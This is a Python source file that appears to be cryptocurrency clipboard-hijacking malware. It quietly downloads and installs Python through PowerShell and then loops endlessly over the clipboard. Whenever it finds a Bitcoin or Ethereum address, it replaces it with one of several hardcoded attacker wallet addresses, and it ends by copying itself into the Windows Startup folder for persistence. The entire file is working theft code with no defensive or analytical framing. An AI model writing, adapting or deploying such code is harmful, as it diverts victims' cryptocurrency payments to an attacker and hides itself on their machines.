import os
import subprocess
import sys

def install_python_and_pyperclip():
    python_version = "3.9.10"
    python_url = "https://www.python.org/ftp/python/3.9.10/python-3.9.10-amd64.exe"
    python_path = f"C:\\Python\\{python_version}\\python.exe"

    if not os.path.exists(python_path):
        # Download Python installer
        subprocess.run(["powershell.exe", f"(New-Object Net.WebClient).DownloadFile('{python_url}', 'python.exe')"])
        # Install Python
        subprocess.run(["python.exe", "/quiet", f"InstallAllUsers=1", f"TargetDir=C:\\Python\\{python_version}", "Include_test=0"])
        os.remove("python.exe")

    # Install pyperclip
    subprocess.run([python_path, "-m", "pip", "install", "pyperclip"])

install_python_and_pyperclip()

import os
import pyperclip
import shutil

# Define the target addresses
btc_addresses = {
    "1": "15NeX4ULnHEDPwRjxedRdecpDD3PqzQw7U",
    "bc1": "bc1q9lugaxp4e00cczl6tfyqluwnhlyd0ekcwvsfk4",
    "3": "3NNGBGiwa5vs2nnA7VAaB9R1XrTg3xeeJN"
}

eth_addresses = ["0xf5450c06CafF5E3E26220D356184b81914CB7f6C", "0xB8643f7fc440A7164a0bA5AF25eDC81C7c7Ca597", "0xEc7cAA68bcF83f2e24c0E23240Da4606E75a0818"]

def replace_address():
    current_address = pyperclip.paste().strip()
    if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3"):
        if current_address in btc_addresses.values():
            return
        else:
            for prefix, target_address in btc_addresses.items():
                if current_address.startswith(prefix):
                    pyperclip.copy(target_address)
                    print(f"BTC address replaced: {current_address} -> {target_address}")
                    return
    elif current_address.startswith("0x"):
        if current_address in eth_addresses:
            return
        else:
            import random
            new_address = random.choice(eth_addresses)
            pyperclip.copy(new_address)
            print(f"ETH address replaced: {current_address} -> {new_address}")

while True:
    try:
        current_address = pyperclip.paste().strip()
        if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3") or current_address.startswith("0x"):
            replace_address()
    except KeyboardInterrupt:
        break

# Save the current script path
script_path = os.path.abspath(sys.argv[0])

# Specify the new folder path in the user's AppData folder
new_folder_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

# Create the new folder if it doesn't exist
os.makedirs(new_folder_path, exist_ok=True)

# Copy the script to the new folder
new_script_path = os.path.join(new_folder_path, os.path.basename(script_path))
shutil.copy(script_path, new_script_path)
